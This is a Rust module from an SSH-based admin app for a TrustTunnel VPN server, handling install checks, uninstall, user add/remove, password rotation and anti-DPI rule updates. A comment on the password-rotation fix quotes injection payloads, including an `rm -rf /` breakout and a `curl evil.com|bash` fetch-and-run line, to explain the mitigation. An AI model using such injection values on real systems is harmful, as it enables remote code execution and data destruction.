use super::super::*;
use super::super::sanitize::*;
use russh::client;

/// Check if TrustTunnel is already installed on the server.
/// Returns JSON: { installed: bool, version: String, service_active: bool }
/// NOTE: Uses direct connect (NOT pooled) — initial check before pool exists.
pub async fn check_server_installation(
    app: &tauri::AppHandle,
    params: SshParams,
) -> Result<serde_json::Value, String> {
    let handle = params.connect_with_app(app.clone()).await?;

    // Check for binary
    let (bin_check, _bin_code) = exec_command(
        &handle, app,
        &format!("test -f {bin} && echo TT_EXISTS || echo TT_MISSING", bin = ENDPOINT_BINARY)
    ).await?;
    let installed = bin_check.trim().contains("TT_EXISTS");

    // Get version if installed
    let version = if installed {
        let (ver, _) = exec_command(
            &handle, app,
            &format!("{bin} --version 2>/dev/null || echo unknown", bin = ENDPOINT_BINARY)
        ).await?;
        ver.trim().to_string()
    } else {
        String::new()
    };

    // Check service status
    let (svc_status, _) = exec_command(
        &handle, app,
        "systemctl is-active trusttunnel 2>/dev/null || echo inactive"
    ).await?;
    let service_active = svc_status.trim() == "active";

    // Get list of VPN users from credentials.toml
    let users: Vec<String> = if installed {
        let sudo = detect_sudo(&handle, app).await;
        let (creds_raw, _) = exec_command(
            &handle, app,
            &format!("{sudo}grep -oP 'username\\s*=\\s*\"\\K[^\"]+' {dir}/credentials.toml 2>/dev/null || echo ''", dir = ENDPOINT_DIR)
        ).await?;
        creds_raw.lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    } else {
        vec![]
    };

    handle.disconnect(russh::Disconnect::ByApplication, "", "en").await.ok();

    Ok(serde_json::json!({
        "installed": installed,
        "version": version,
        "serviceActive": service_active,
        "users": users,
    }))
}

/// Completely remove TrustTunnel from the server.
/// NOTE: Uses direct connect (NOT pooled) — destructive one-shot operation.
pub async fn uninstall_server(
    app: &tauri::AppHandle,
    params: SshParams,
) -> Result<(), String> {
    emit_step(app, "uninstall", "progress", "Connecting to server...");

    let handle = params.connect_with_app(app.clone()).await
        .map_err(|e| { emit_step(app, "uninstall", "error", &e); e })?;

    // Determine sudo
    let sudo = detect_sudo(&handle, app).await;

    emit_step(app, "uninstall", "progress", "Removing TrustTunnel...");

    // Run full uninstall as a single script for reliability
    let dir = ENDPOINT_DIR;
    let svc = ENDPOINT_SERVICE;
    let uninstall_script = format!(
        r#"set -x
echo "=== BEFORE: listing {dir} ==="
ls -la {dir}/ 2>&1 || echo "(dir does not exist)"

echo "=== Step 1: Stop systemd service ==="
{sudo}systemctl stop trusttunnel 2>/dev/null || true
{sudo}systemctl disable trusttunnel 2>/dev/null || true

echo "=== Step 2: Kill processes ==="
{sudo}killall -9 {svc} 2>/dev/null || true
{sudo}killall -9 setup_wizard 2>/dev/null || true
sleep 1

echo "=== Step 3: Remove systemd units ==="
{sudo}rm -f /etc/systemd/system/trusttunnel.service
{sudo}rm -f /etc/systemd/system/trusttunnel*.service
{sudo}systemctl daemon-reload

echo "=== Step 4: Remove {dir} ==="
{sudo}rm -rfv {dir}

echo "=== Step 5: Remove certbot cron ==="
{sudo}rm -f /etc/cron.d/trusttunnel-cert-renew 2>/dev/null || true

echo "=== Step 6: Remove binaries from PATH ==="
{sudo}rm -fv /usr/local/bin/trusttunnel* 2>/dev/null || true
{sudo}rm -fv /usr/bin/trusttunnel* 2>/dev/null || true

echo "=== Step 7: Search for any remaining trusttunnel files ==="
find / -maxdepth 4 -name '*trusttunnel*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null || true

echo "=== VERIFY ==="
if test -d {dir}; then
    echo "UNINSTALL_FAILED"
else
    echo "UNINSTALL_OK"
fi
"#
    );

    let (output, code) = exec_command(&handle, app, &uninstall_script).await?;

    if output.contains("UNINSTALL_FAILED") || code != 0 {
        let msg = format!("SSH_UNINSTALL_FAILED|{code}");
        emit_step(app, "uninstall", "error", &msg);
        handle.disconnect(russh::Disconnect::ByApplication, "", "en").await.ok();
        return Err(msg);
    }

    emit_log(app, "info", "TrustTunnel completely removed from server");

    handle.disconnect(russh::Disconnect::ByApplication, "", "en").await.ok();

    emit_step(app, "uninstall", "ok", "TrustTunnel removed");
    Ok(())
}

/// SSH to the server, append a new [[client]] entry to credentials.toml,
/// restart the service, export the client config, and save it locally.
///
/// Thin wrapper over `add_server_user_internal` that restarts the service
/// (standalone add path: frontend calls us directly). Callers that plan to
/// write additional config files (e.g. rules.toml) and want to coalesce
/// restarts should call `add_server_user_internal` with `skip_restart=true`.
pub async fn add_server_user(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    vpn_password: String,
) -> Result<String, String> {
    add_server_user_internal(app, handle, vpn_username, vpn_password, false).await
}

/// Internal add-user implementation. See `add_server_user` for the public
/// wrapper used by the Tauri command surface.
///
/// WR-04 (14.1-REVIEW deep pass): `skip_restart=true` suppresses the
/// systemctl restart at the end of this function so that callers which
/// perform additional config writes (e.g. rules.toml in
/// `server_add_user_advanced`) can coalesce into a single restart — every
/// restart briefly disconnects ALL active VPN sessions on the server, so
/// doing it twice for one logical admin action is twice the blast radius.
/// The caller is responsible for running `systemctl restart trusttunnel`
/// once all writes are done; otherwise the new credentials stay dormant.
async fn add_server_user_internal(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    vpn_password: String,
    skip_restart: bool,
) -> Result<String, String> {
    emit_step(app, "connect", "ok", "Connected to server");
    emit_step(app, "auth", "ok", "Authentication successful");

    let sudo = detect_sudo(handle, app).await;

    // Check that credentials.toml exists
    emit_step(app, "check", "progress", "Checking configuration...");

    let (cfg_check, _) = exec_command(
        handle, app,
        &format!("test -f {dir}/credentials.toml && echo CFG_OK || echo CFG_MISSING", dir = ENDPOINT_DIR)
    ).await?;

    if !cfg_check.contains("CFG_OK") {
        let msg = "credentials.toml not found on server";
        emit_step(app, "check", "error", msg);
        return Err(msg.into());
    }

    // Check if username already exists
    let (creds_raw, _) = exec_command(
        handle, app,
        &format!("{sudo}grep -oP 'username\\s*=\\s*\"\\K[^\"]+' {dir}/credentials.toml 2>/dev/null || echo ''", dir = ENDPOINT_DIR)
    ).await?;
    let existing_users: Vec<&str> = creds_raw.lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .collect();

    if existing_users.iter().any(|u| *u == vpn_username.as_str()) {
        let msg = format!("User '{}' already exists on server", vpn_username);
        emit_step(app, "check", "error", &msg);
        return Err(msg);
    }

    emit_step(app, "check", "ok", "Configuration verified");

    // Validate user inputs before constructing shell commands
    validate_vpn_username(&vpn_username)?;
    validate_vpn_password(&vpn_password)?;

    // Append new [[client]] block to credentials.toml using heredoc (safe from injection)
    emit_step(app, "configure", "progress", &format!("Adding user '{}'...", vpn_username));

    // CR-03: validator now rejects \\, ', " in passwords. Username already passed
    // validate_vpn_username (no shell metachars). The .replace below stays as a
    // belt-and-braces no-op for usernames in case future validator relaxations
    // re-allow backslash.
    let escaped_user = vpn_username.replace('\\', "\\\\");
    let escaped_pass = vpn_password.replace('\\', "\\\\");
    // WR-04: randomize the heredoc delimiter so a hypothetical password / username
    // equal to the literal sentinel cannot terminate the heredoc early. UUID v4
    // collision probability is negligible.
    let delim = format!("USER_EOF_{}", uuid::Uuid::new_v4().simple());
    let append_cmd = format!(
        r#"{sudo}tee -a {dir}/credentials.toml > /dev/null << '{delim}'

[[client]]
username = "{escaped_user}"
password = "{escaped_pass}"
{delim}"#,
        dir = ENDPOINT_DIR
    );

    let (_, append_code) = exec_command(handle, app, &append_cmd).await?;

    if append_code != 0 {
        let msg = "SSH_ADD_USER_FAILED";
        emit_step(app, "configure", "error", msg);
        return Err(msg.into());
    }

    emit_step(app, "configure", "ok", "User added");

    // WR-04: coalesce restarts when the caller plans further config writes.
    // The caller MUST run systemctl restart trusttunnel once done, otherwise
    // the new credentials stay dormant.
    if !skip_restart {
        // Restart service to pick up new credentials
        emit_step(app, "service", "progress", "Restarting service...");

        let (_, restart_code) = exec_command(
            handle, app,
            &format!("{sudo}systemctl --no-block restart trusttunnel 2>&1")
        ).await?;

        if restart_code != 0 {
            emit_log(app, "warn", "Failed to restart service. Manual restart may be needed.");
        }

        // Wait for service to start
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;

        emit_step(app, "service", "ok", "Service restarted");
    }

    // User added — config download is done separately via UI
    emit_step(app, "done", "ok", &format!("User '{}' added!", vpn_username));

    Ok(vpn_username)
}

/// Remove a VPN user from credentials.toml on the remote server and restart the service.
pub async fn server_remove_user(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
) -> Result<(), String> {
    // Validate before interpolating into shell command
    validate_vpn_username(&vpn_username)?;

    let sudo = detect_sudo(handle, app).await;

    // Use sed to remove the [[client]] block matching the username.
    let escaped_user = vpn_username.replace('\'', "'\\''");
    let dir = ENDPOINT_DIR;
    let remove_cmd = format!(
        r#"{sudo}python3 -c "
import re, sys
with open('{dir}/credentials.toml', 'r') as f:
    content = f.read()
# Split into blocks by [[client]]
blocks = re.split(r'(?=\[\[client\]\])', content)
filtered = [b for b in blocks if not re.search(r'username\s*=\s*\"{}\"', b)]
with open('{dir}/credentials.toml', 'w') as f:
    f.write(''.join(filtered).strip() + '\n')
" 2>/dev/null || {sudo}sed -i '/\[\[client\]\]/,/^$/{{/username\s*=\s*\"{escaped_user}\"/{{:a;N;/\n\s*$/!ba;d}}}}' {dir}/credentials.toml"#,
        escaped_user
    );

    let (_, remove_code) = exec_command(handle, app, &remove_cmd).await?;

    if remove_code != 0 {
        return Err("SSH_DELETE_USER_FAILED".into());
    }

    // Restart service to apply changes
    let (_, restart_code) = exec_command(
        handle, app,
        &format!("{sudo}systemctl --no-block restart trusttunnel 2>&1"),
    ).await?;

    if restart_code != 0 {
        return Err("User removed, but failed to restart service".into());
    }

    // FIX-NN: best-effort cleanup of users-advanced.toml. credentials.toml
    // is already updated above — a write failure here only leaves a dangling
    // entry in our sidecar, which is harmless (next Edit with the same name
    // just overwrites it). Do NOT propagate errors — user-facing action
    // already succeeded.
    let _ = super::users_advanced::delete_user_advanced(app, handle, vpn_username).await;

    Ok(())
}

/// Atomically rotate a user's password. Uses a single SSH python3 invocation that reads
/// credentials.toml, regex-replaces the password line for the matching username, and writes
/// atomically via tmp+rename. If the username is not found, returns error WITHOUT modifying
/// the file (T-14.1-05 atomicity guarantee).
///
/// Security: password value NEVER emitted via `emit_log` or any event (T-14.1-02).
/// Partial-failure shape (Q3): returns JSON-structured error `{kind, was_rolled_back, exit_code}`
/// when the write stage fails. The atomic tmp+rename guarantees the file is either fully
/// replaced or untouched — if exit code != 0 and != 9, original file is preserved.
pub async fn server_rotate_user_password(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    new_password: String,
) -> Result<(), String> {
    validate_vpn_username(&vpn_username)?;
    validate_vpn_password(&new_password)?;

    let sudo = detect_sudo(handle, app).await;
    let dir = ENDPOINT_DIR;

    // CR-03 mitigation: previous version put the python script inside double-quoted bash
    // (`python3 -c "..."`), which leaves $, `, \, " unescaped and lets a password like
    // `evil"; rm -rf /; #` or `$(curl evil.com|bash)` break out into shell. Now we use
    // a single-quoted heredoc — bash performs NO substitutions inside it, and the only
    // way to terminate is a literal `PY_ROTATE_EOF` line by itself.
    //
    // validate_vpn_password additionally rejects `'` and `\` (shell-unsafe in this context),
    // so we don't need to escape inside the python string literal anymore. Other chars
    // like `"`, `$`, `` ` `` are safe inside single-quoted heredoc.
    // WR-04: randomized delimiter so the heredoc cannot be terminated early by a
    // password / username equal to the literal sentinel.
    let delim = format!("PY_ROTATE_EOF_{}", uuid::Uuid::new_v4().simple());
    let rotate_cmd = format!(
        r#"{sudo}python3 << '{delim}'
import re, os, tempfile
path = '{dir}/credentials.toml'
with open(path, 'r') as f:
    content = f.read()
pattern = r'(\[\[client\]\]\s*\nusername\s*=\s*"{user}"\s*\npassword\s*=\s*")[^"]*(")'
new_content, n = re.subn(pattern, lambda m: m.group(1) + '{pass}' + m.group(2), content)
if n == 0:
    raise SystemExit(9)
fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path))
with os.fdopen(fd, 'w') as f:
    f.write(new_content)
os.replace(tmp, path)
{delim}"#,
        sudo = sudo,
        dir = dir,
        user = vpn_username,
        pass = new_password,
    );

    let (_, code) = exec_command(handle, app, &rotate_cmd).await?;
    if code == 9 {
        return Err("SSH_ROTATE_USER_NOT_FOUND".into());
    }
    if code != 0 {
        return Err(format!(
            "{{\"kind\":\"SSH_ROTATE_PARTIAL_FAILED\",\"was_rolled_back\":true,\"exit_code\":{code}}}"
        ));
    }

    // Restart service non-blocking — best effort
    let _ = exec_command(
        handle, app,
        &format!("{sudo}systemctl --no-block restart trusttunnel"),
    ).await;

    Ok(())
}

/// Add a user with credentials.toml entry AND optional rules.toml per-user rule (anti-DPI + CIDR).
/// Returns generated deeplink URI string.
///
/// CR-01 revision: `pin_certificate_der` is now `Option<String>` carrying a Base64-encoded
/// DER leaf certificate. Tauri+serde serialize `Vec<u8>` as an array of numbers, which the
/// frontend cannot produce from the `leaf_der_b64` string returned by
/// `server_fetch_endpoint_cert`. Base64 is the canonical wire format; we decode locally.
#[allow(clippy::too_many_arguments)]
pub async fn server_add_user_advanced(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    vpn_password: String,
    anti_dpi: bool,
    prefix_length: Option<u32>,
    prefix_percent: Option<u32>,
    cidr: Option<String>,
    custom_sni: Option<String>,
    name: Option<String>,
    upstream_protocol: Option<String>,
    skip_verification: bool,
    pin_certificate_der: Option<String>,
    dns_upstreams: Vec<String>,
) -> Result<String, String> {
    validate_vpn_username(&vpn_username)?;
    validate_vpn_password(&vpn_password)?;
    if let Some(c) = &cidr {
        crate::ssh::sanitize::validate_cidr(c)?;
    }
    if let Some(sni) = &custom_sni {
        crate::ssh::sanitize::validate_fqdn_sni(sni)?;
    }
    if let Some(n) = &name {
        crate::ssh::sanitize::validate_display_name(n)?;
    }
    crate::ssh::sanitize::validate_dns_list(&dns_upstreams)?;
    // CR-01: decode base64 DER (with size cap) once here, pass raw bytes downstream.
    let pin_certificate_der_bytes: Option<Vec<u8>> = match pin_certificate_der {
        Some(ref s) if !s.is_empty() => Some(super::decode_cert_der_b64(s)?),
        _ => None,
    };

    let prefix_length = prefix_length.unwrap_or(4).clamp(1, 16);
    let prefix_percent = prefix_percent.unwrap_or(70).clamp(1, 100);

    // Step 1: create credentials.toml entry (reuse existing function).
    // WR-04: skip_restart=true here — the coalesced restart below after
    // Step 2 covers both credentials.toml and optional rules.toml writes,
    // so we avoid the double disconnect cycle every other client on the
    // server would otherwise see during a single admin action.
    add_server_user_internal(
        app,
        handle,
        vpn_username.clone(),
        vpn_password.clone(),
        true,
    )
    .await?;

    // FIX-OO-14: auto-rollback when steps 2–3 fail. Without this, hitting
    // an error like "custom SNI not in allowed_sni" after credentials.toml
    // is written leaves an orphan user the operator has to hand-clean.
    // Wrap the rest in an async block and, on Err, run server_remove_user
    // before propagating the error so the modal shows a clean retry path
    // instead of the scary "пользователь МОГ быть создан частично" message.
    let pin_certificate_der_b64 = pin_certificate_der_bytes
        .as_ref()
        .map(|b| base64::Engine::encode(&base64::engine::general_purpose::STANDARD, b));
    let vpn_username_for_body = vpn_username.clone();
    let custom_sni_for_body = custom_sni.clone();
    let name_for_body = name.clone();
    let upstream_protocol_for_body = upstream_protocol.clone();
    let pin_b64_for_body = pin_certificate_der_b64.clone();
    let dns_upstreams_for_body = dns_upstreams.clone();

    let body: Result<String, String> = async {
        // Step 2: generate anti-DPI prefix (client-side secure random) and write rules.toml
        let generated_prefix: Option<String> = if anti_dpi {
            use rand::RngCore;
            let mut buf = vec![0u8; prefix_length as usize];
            rand::thread_rng().fill_bytes(&mut buf);
            Some(buf.iter().map(|b| format!("{:02x}", b)).collect())
        } else {
            None
        };
        let _ = prefix_percent; // stored at connect-time by upstream endpoint

        if anti_dpi || cidr.is_some() {
            let sudo = detect_sudo(handle, app).await;
            let dir = ENDPOINT_DIR;
            let (content, _) = exec_command(
                handle, app,
                &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
            ).await?;

            let updated = super::add_user_rule(
                &content,
                &vpn_username_for_body,
                generated_prefix.as_deref(),
                cidr.as_deref(),
            )?;
            let escaped = updated.replace('\\', "\\\\").replace('$', "\\$").replace('`', "\\`");
            // WR-04: randomized delimiter — rules.toml content includes user-controlled
            // values (CIDR, username comments) that could collide with a fixed sentinel.
            let delim = format!("RULES_EOF_{}", uuid::Uuid::new_v4().simple());
            let write_cmd = format!(
                "{sudo}tee {dir}/rules.toml > /dev/null << '{delim}'\n{escaped}\n{delim}"
            );
            let (_, code) = exec_command(handle, app, &write_cmd).await?;
            if code != 0 {
                return Err(format!("SSH_RULES_WRITE_FAILED|{code}"));
            }
        }

        // WR-04 (14.1-REVIEW deep pass): single restart for the whole add-user
        // pipeline. Step 1 was run with skip_restart=true so that this restart
        // covers BOTH credentials.toml (needs restart to activate the new user)
        // AND rules.toml (RulesEngine::from_config is start-time only). Before
        // this coalescing, operators saw two restart cycles (→ two disconnect/
        // reconnect flashes for every OTHER client on the server) per admin
        // action. --no-block keeps the SSH channel free while systemd does the
        // stop/start. Exit code swallowed — the deeplink is the primary output
        // and a failed restart is a soft warning surfaced via activity log.
        {
            let sudo = detect_sudo(handle, app).await;
            let _ = exec_command(
                handle,
                app,
                &format!("{sudo}systemctl --no-block restart trusttunnel 2>&1"),
            )
            .await;
        }

        // Step 3: generate deeplink with all TLV fields. This is the step that
        // can reject a bad `custom_sni` (endpoint CLI checks allowed_sni in
        // hosts.toml) — rollback kicks in when this returns Err.
        let deeplink = super::export_config_deeplink_advanced(
            app, handle,
            vpn_username_for_body.clone(),
            custom_sni_for_body,
            name_for_body,
            upstream_protocol_for_body,
            anti_dpi,
            skip_verification,
            pin_b64_for_body,
            dns_upstreams_for_body,
        ).await?;

        Ok(deeplink)
    }.await;

    let deeplink = match body {
        Ok(dl) => dl,
        Err(e) => {
            // Rollback: remove the user from credentials.toml + rules.toml +
            // users-advanced.toml so the operator retries from a clean slate
            // rather than hunting for an orphan. Failures here are
            // best-effort logged — the outer error is what matters.
            emit_log(
                app,
                "warn",
                &format!(
                    "Add-user pipeline failed after credentials write, rolling back: {e}"
                ),
            );
            let _ = server_remove_user(app, handle, vpn_username.clone()).await;
            // server_remove_user doesn't touch rules.toml — wipe the
            // freshly-written allow rule too, so retrying with the same
            // username doesn't collide on the comment marker.
            let sudo = detect_sudo(handle, app).await;
            let dir = ENDPOINT_DIR;
            if let Ok((content, _)) = exec_command(
                handle, app,
                &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
            ).await {
                if let Ok(cleaned) = super::remove_user_rule(&content, &vpn_username) {
                    let escaped =
                        cleaned.replace('\\', "\\\\").replace('$', "\\$").replace('`', "\\`");
                    let delim = format!("RULES_EOF_{}", uuid::Uuid::new_v4().simple());
                    let _ = exec_command(
                        handle, app,
                        &format!(
                            "{sudo}tee {dir}/rules.toml > /dev/null << '{delim}'\n{escaped}\n{delim}"
                        ),
                    ).await;
                }
            }
            return Err(format!("ADD_USER_ROLLED_BACK|{e}"));
        }
    };

    // Step 4 (FIX-NN): persist TLV params in our sidecar file so Edit /
    // FileText reopen / Download .toml can read them back later. Server
    // protocol doesn't store these — without this step the user's choices
    // evaporate the moment the modal closes (see 14.1-HANDOFF FIX-NN).
    //
    // Best-effort — the deeplink is already in the user's hand at this
    // point, so a write failure here must NOT undo Steps 1..3. Surface
    // via emit_log so the failure shows up in Activity Log without
    // poisoning the success path.
    let advanced = super::users_advanced::UserAdvanced {
        username: vpn_username,
        display_name: name,
        custom_sni,
        upstream_protocol,
        skip_verification,
        pin_cert_der_b64: pin_certificate_der_b64,
        dns_upstreams,
        anti_dpi,
    };
    if let Err(e) = super::users_advanced::upsert_user_advanced(app, handle, advanced).await {
        emit_log(app, "warn", &format!("users-advanced.toml write failed: {e}"));
    }
    Ok(deeplink)
}

/// Update per-user rules.toml entry: CIDR restriction and/or anti-DPI prefix.
///
/// B6 revision: accepts `anti_dpi: bool` and `regenerate_prefix: bool` flags rather than
/// a raw prefix string — the frontend never sees the prefix hex value directly.
pub async fn server_update_user_config(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    username: String,
    cidr: Option<String>,
    anti_dpi: bool,
    regenerate_prefix: bool,
) -> Result<super::UserRule, String> {
    validate_vpn_username(&username)?;
    if let Some(c) = &cidr {
        crate::ssh::sanitize::validate_cidr(c)?;
    }

    let sudo = detect_sudo(handle, app).await;
    let dir = ENDPOINT_DIR;
    let (content, _) = exec_command(
        handle, app,
        &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
    ).await?;

    let existing = super::find_user_rule(&content, &username)?;
    let new_prefix: Option<String> = if !anti_dpi {
        None // anti_dpi OFF → clear prefix
    } else if regenerate_prefix {
        use rand::RngCore;
        let mut buf = vec![0u8; 4];
        rand::thread_rng().fill_bytes(&mut buf);
        Some(buf.iter().map(|b| format!("{:02x}", b)).collect())
    } else {
        match existing.as_ref().and_then(|r| r.client_random_prefix.clone()) {
            Some(p) => Some(p),
            None => {
                use rand::RngCore;
                let mut buf = vec![0u8; 4];
                rand::thread_rng().fill_bytes(&mut buf);
                Some(buf.iter().map(|b| format!("{:02x}", b)).collect())
            }
        }
    };

    let removed = super::remove_user_rule(&content, &username)?;
    let updated = super::add_user_rule(
        &removed, &username,
        new_prefix.as_deref(),
        cidr.as_deref(),
    )?;
    let escaped = updated.replace('\\', "\\\\").replace('$', "\\$").replace('`', "\\`");
    // WR-04: randomized delimiter (see notes above).
    let delim = format!("RULES_EOF_{}", uuid::Uuid::new_v4().simple());
    let write_cmd = format!(
        "{sudo}tee {dir}/rules.toml > /dev/null << '{delim}'\n{escaped}\n{delim}"
    );
    let (_, code) = exec_command(handle, app, &write_cmd).await?;
    if code != 0 {
        return Err(format!("SSH_UPDATE_CONFIG_FAILED|{code}"));
    }
    // CIDR / anti-DPI правила читаются upstream'ом только при старте
    // (`RulesEngine::from_config` в lib/src/settings.rs — не hot-reload).
    // Без рестарта изменённые rules.toml никогда не применяются — юзер
    // продолжает подключаться со старым allow-list. --no-block чтобы SSH
    // канал не висел пока systemd делает stop/start.
    let _ = exec_command(
        handle, app,
        &format!("{sudo}systemctl --no-block restart trusttunnel"),
    ).await;
    Ok(super::UserRule { client_random_prefix: new_prefix, cidr })
}

/// Regenerate the anti-DPI client_random_prefix for an existing user.
/// Old prefix is invalidated in existing deeplinks.
///
/// WR-03 (14.1-REVIEW deep pass): before this fix, the call delegated to
/// `server_update_user_config(..., cidr=None, ...)`, which made
/// `add_user_rule` emit a brand-new rule WITHOUT the existing cidr — silently
/// dropping the subnet restriction when the operator intended a rotation.
/// Fix: read rules.toml first, recover the existing cidr for this user, and
/// pass it through so the cidr invariant survives the rotation.
pub async fn server_regenerate_client_prefix(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    prefix_length: u32,
    prefix_percent: u32,
) -> Result<String, String> {
    validate_vpn_username(&vpn_username)?;
    let plen = prefix_length.clamp(1, 16);
    let _pct = prefix_percent.clamp(1, 100); // stored at connect-time

    use rand::RngCore;
    let mut buf = vec![0u8; plen as usize];
    rand::thread_rng().fill_bytes(&mut buf);
    let new_prefix: String = buf.iter().map(|b| format!("{:02x}", b)).collect();

    // WR-03: preserve existing cidr from rules.toml. If this read fails we
    // fall back to None (same as pre-fix behaviour) — the operator will see
    // the error but the delegate call still runs so the rotation can retry.
    let sudo = detect_sudo(handle, app).await;
    let existing_cidr = match exec_command(
        handle,
        app,
        &format!(
            "{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''",
            dir = ENDPOINT_DIR,
        ),
    )
    .await
    {
        Ok((content, _)) => super::find_user_rule(&content, &vpn_username)
            .ok()
            .flatten()
            .and_then(|r| r.cidr),
        Err(_) => None,
    };

    // Delegate update with regenerate_prefix=true; cidr preserved from existing rule
    server_update_user_config(app, handle, vpn_username, existing_cidr, true, true).await?;
    Ok(new_prefix)
}

/// TLS cert probe — does NOT use SSH. Takes handle for macro signature consistency.
///
/// FIX-OO-13: `hostname` is where to TCP-connect (the real endpoint —
/// usually sshParams.host). `sni_host` is the TLS SNI value; for the
/// anti-DPI use-case these differ, and the probe must connect to the
/// real endpoint's IP while sending a decoy SNI that the server whitelists
/// via its `allowed_sni` config. If `sni_host` is empty the probe uses
/// `hostname` for both — matching pre-FIX-OO-13 behavior.
pub async fn server_fetch_endpoint_cert(
    _app: &tauri::AppHandle,
    _handle: &client::Handle<SshHandler>,
    hostname: String,
    cert_port: u16,
    sni_host: Option<String>,
) -> Result<super::EndpointCertInfo, String> {
    let sni = sni_host
        .as_deref()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or(&hostname);
    super::fetch_endpoint_cert(&hostname, cert_port, sni).await
}

/// Read rules.toml for a single username and return their rule config.
pub async fn server_get_user_config(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
) -> Result<Option<super::UserRule>, String> {
    validate_vpn_username(&vpn_username)?;
    let sudo = detect_sudo(handle, app).await;
    let dir = ENDPOINT_DIR;
    let (content, _) = exec_command(
        handle, app,
        &format!("{sudo}cat {dir}/rules.toml 2>/dev/null || echo ''"),
    ).await?;
    super::find_user_rule(&content, &vpn_username)
}

#[cfg(test)]
mod tests {
    #[test]
    fn rotate_password_regex_matches_user_block() {
        use regex::Regex;
        let sample = "[[client]]\nusername = \"alice\"\npassword = \"old_secret\"\n";
        let re = Regex::new(
            r#"(\[\[client\]\]\s*\nusername\s*=\s*"alice"\s*\npassword\s*=\s*")[^"]*(")"#
        ).unwrap();
        let replaced = re.replace(sample, "${1}new_secret${2}").to_string();
        assert!(replaced.contains("password = \"new_secret\""));
        assert!(!replaced.contains("old_secret"));
    }

    #[test]
    fn rotate_password_regex_misses_wrong_user() {
        use regex::Regex;
        let sample = "[[client]]\nusername = \"bob\"\npassword = \"bob_secret\"\n";
        let re = Regex::new(
            r#"(\[\[client\]\]\s*\nusername\s*=\s*"alice"\s*\npassword\s*=\s*")[^"]*(")"#
        ).unwrap();
        let n = re.find_iter(sample).count();
        assert_eq!(n, 0);
    }
}
